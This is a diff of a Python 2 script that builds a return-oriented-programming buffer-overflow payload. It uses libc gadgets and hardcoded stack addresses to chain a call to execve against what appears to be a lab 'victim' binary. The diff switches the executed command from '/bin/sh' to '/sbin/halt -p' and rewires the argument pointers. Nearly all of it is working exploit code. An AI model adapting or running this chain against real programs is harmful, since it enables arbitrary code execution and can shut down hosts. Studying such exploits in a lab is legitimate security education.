@@ -3,9 +3,9 @@ from struct import pack
 # Command used to extract these addresses
 # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep rdx
 
-# buff_base = 0x7fffffffdcf0
-# buff_base = 0x7fffffffe450
-buff_base = 0x7fffffffdd00
+buff_base = 0x7fffffffdcf0  # gdb
+# buff_base = 0x7fffffffe440
+# buff_base = 0x7fffffffdd00    # bash
 # buff_base = 2251799813545200
 
 # gdb vic... b main
@@ -35,8 +35,10 @@ execve = base + execve
 
 string0 = 0x000000000000003b
 string1 = buff_base + 0x80 # 72 + 8*7
-string2 = 0x00
+string2 = buff_base + 0xA0  # 72 + 8*10
 string3 = 0x00
+
+# string4 = buff_base + 0x90
 
 # string0 = 0x000000000000003b
 # string1 = 0x007FFFFFFFDDD70
@@ -74,8 +76,11 @@ buff += pack("<Q", execve)
 # buff += "B" * 8
 # buff += pack("<Q", 0x2f7362696e2f6861)
 # buff += pack("<Q", 0x0000000000006c74)
-buff += "/bin/sh"
-buff += "\x00"
+# 2f7362696e2f6861
+buff += "/sbin/halt"
+# buff += "\x61\x68\x2f\x6e\x69\x62\x73\x2f"
+# buff += "\x74\x6c\x00\x00\x00\x00\x00\x00"
+buff += "\x00" * 6
 # buff += "\x00\x00\x00\x00\x00\x00"
 # 2f 62 69 6e 2f 73 68
 # buff += "\x68\x73\x2f\x6e\x69\x62\x2f\x00"
@@ -84,10 +89,13 @@ buff += "\x00"
 # buff += "\x74\x6c\x00\x00\x00\x00\x00\x00"
 # buff += "\x00"
 # buff += "\x08" * 8
-# buff += "-p"
-buff += "\x00" * 8
+buff += "-p"
+buff += "\x00" * 6
 # buff += "\x70\x2d\x00\x00\x00\x00\x00\x00"
 # buff += pack("<Q", 0x0000000000002d70)
+buff += "\x00" * 8
+buff += pack("<Q", string1)
+buff += pack("<Q", string1 + 0x10)
 buff += "\x00" * 8
 
 print buff
